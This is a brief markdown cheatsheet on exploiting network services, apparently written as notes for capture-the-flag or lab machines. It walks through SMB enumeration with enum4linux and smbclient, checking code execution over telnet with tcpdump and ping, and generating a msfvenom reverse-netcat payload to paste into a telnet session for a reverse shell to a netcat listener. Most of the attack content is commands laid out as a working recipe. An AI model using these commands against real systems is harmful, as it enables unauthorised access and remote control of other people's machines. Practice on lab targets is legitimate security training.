# network services exploitation cheatsheet

Before everything: make a nmap scan for finding open and vulnerable ports.

## SMB

Clients connect to servers using TCP/IP (actually NetBIOS over TCP/IP as specified in RFC1001 and RFC1002), NetBEUI or IPX/SPX. 

### Enum4linux

It is a tool used to enumerate SMB shares. Makes it easy to quickly extract information from the target pertaining to SMB.
```
  SYNTAX = "enum4linux [options] ip"
    
 OPTIONS:
 
 -U             get userlist
 -M             get machine list
 -N             get namelist dump (different from -U and-M)
 -S             get sharelist
 -P             get password policy information
 -G             get group and member list

 -a             all of the above (full basic enumeration)
```

#### Using SMBCLIENT
```
 SYNTAX: smbclient //[IP]/[SHARE]
```
```
Followed by: 

-U [name] : to specify the user

-p [port] : to specify the port
```


 ## Telnet
 ```
  SYNTAX: "telnet [ip][port]"
 ```
 ### Enumerating telnet
 
 check:
 
 https://www.cvedetails.com/
 https://cve.mitre.org/
 
 for finding vulnerabilities.
 
 Also, we can find an obvious misconfiguration that let us exploit it.
 
 ### Connecting Telnet
 ```
  SYNTAX: "telnet [ip] [port]"
 ```
 
 In case we can`t see if we are executing what we type we can use **tcpdump**
 ```
 sudo tcpdump ip proto \\icmp -i tun0 //tun0 = network interface in use
 ```
 We need to preface the commands in the telnet machine terminal with ".RUN"
 
 ex: 
 ```
 .RUN ping -c 1 [attackingMachine.localhost] //we can use that command                      to see that we are correctly executing code]
 ```
 
 ### Generating a reverse shell payload (using msfvenom)
 
 ```
 SYNTAX: **"msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R"
 
  Where:
  -p = payload
  lhost = our local host IP address (this is your machine's IP address)
  lport = the port to listen on (this is the port on your machine)
  R = export the payload in raw format
  ```
  
  Now we can use a netcat listener on our local machine:
  ```
  "nc -lvp [listening port]" 
  ```
  Now we just need to copy and paste our msfvenom payload into the telnet session and run it as a command. Then we'll be able to use a shell through the listener previously deployed.
